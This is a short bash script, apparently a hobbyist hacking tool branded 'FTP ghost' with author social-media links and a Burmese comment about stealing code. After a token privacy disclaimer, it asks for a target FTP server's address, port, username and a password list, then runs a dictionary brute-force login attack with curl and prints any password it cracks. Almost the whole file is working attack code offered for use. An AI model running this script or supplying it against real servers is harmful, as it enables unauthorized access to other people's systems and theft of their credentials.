# codeမခိုးနဲ့ Scriptတစ်ခုရဖို့ မနည်းရေးထားရတာနော်😼
#!/bin/bash
clear 
echo -e "\e[1;31m ! Warning: You are responsible for any issues that may arise if you use this script to infringe on the privacy of others ! \e[0m
"
sleep 4 
clear
echo -e "\e[1;34m          
                            _______
                           |/      |
                           |      (_)
                           |      \|/
                           |       |
                           |      / \ 
                           |
                          _|___"
echo ""
 echo -e "\e[1;33m
          █▀▀ █ █▀█ █▀▀   █▀▀ █░█ █▀█ █▀ ▀█▀
          █▀░ █ █▀▄ ██▄   █▄█ █▀█ █▄█ ▄█ ░█░"
echo ""
echo -e "\e[1;34m                BY Ad A M (Mr.Rabbit) \e[0m"
echo ""
echo -e "\e[1;35m FaceBook account :: https://www.facebook.com/Mr.Rabbit.AdAM"
  echo ""
  echo -e "\e[1;36m GitHub account :: https://github.com/Mr-Rabbit-AdAM "
echo ""
echo -e "\e[1;32m Instagram account :: https://www.instagram.com/pyaesonehmoo\e[0m"
echo "" 
read -p "Enter Trage FTP Server  IP addres :: " i 
echo ""
read -p "Enter Trage FTP Server Port :: " p
echo ""
read -p "Enter the password file location :: " pa
echo ""
read -p "Enter FTP  UserName :: " a 
echo ""
for g in $(cat $pa)
    do
        url=$(curl -s -o /dev/null  -w "%{http_code}" -u $a:$g ftp://$i:$p)
        if [ "$url" == "226" ];then
            echo -e "\e[1;32m [✓] Password found # === > $g \e[0m"
           
  echo -e "\e[1;32m            [info]
    server   ::  ftp://$i:$p 
    username :: $a
    Password :: $g \e[0m"
            exit
        else
            echo -e "\e[1;31m [!] Password  not found # === > $g \e[0m"
        fi
    done
